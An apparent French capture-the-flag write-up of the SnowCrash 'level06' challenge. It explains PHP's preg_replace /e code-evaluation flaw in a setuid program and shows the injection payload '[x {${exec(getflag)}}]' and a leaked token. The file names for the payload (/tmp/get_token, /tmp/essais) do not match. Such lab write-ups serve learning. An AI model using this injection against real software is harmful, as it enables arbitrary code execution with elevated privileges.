```shell
ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

```php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m; }
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a; }
$r = x($argv[1], $argv[2]);
print $r;
?>
```
La fonction preg_replace() en PHP est utilisée pour effectuer une recherche et un remplacement de chaînes de caractères basées sur des expressions régulières (REGEX).

l'option /e est utilisée dans les expressions régulières pour évaluer dynamiquement le remplacement en tant que code PHP.

 L'expression régulière "/(\[x (.*)\])/e" dans la fonction preg_replace() en PHP correspond à une chaîne de caractères qui contient [x suivi d'un ou plusieurs espaces et de n'importe quel caractère (.*) jusqu'à ce qu'un ] soit trouvé. Les parenthèses sont utilisées pour capturer la sous-chaîne correspondant à (.*).

 Ainsi, en utilisant preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a), la fonction va rechercher toutes les occurrences de la chaîne de caractères [x suivie d'un ou plusieurs espaces, suivie de n'importe quelle sous-chaîne jusqu'à ce qu'un ] soit trouvé. La fonction va ensuite remplacer toute la sous-chaîne correspondante par le résultat de l'exécution de la fonction y() avec le deuxième groupe de capture (\\2) comme argument.

Par exemple, si $a est égal à la chaîne de caractères [x test], la fonction preg_replace() va capturer la sous-chaîne test et l'exécuter comme argument de la fonction y(). Le résultat final sera le résultat de l'exécution de la fonction y("test").

On va donc *injecter* un code pour executer getflag ( les fichiers on -user=flag06)

```shell
echo '[x {${exec(getflag)}}]' > /tmp/get_token
```

```shell
./level06 /tmp/essais 42
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```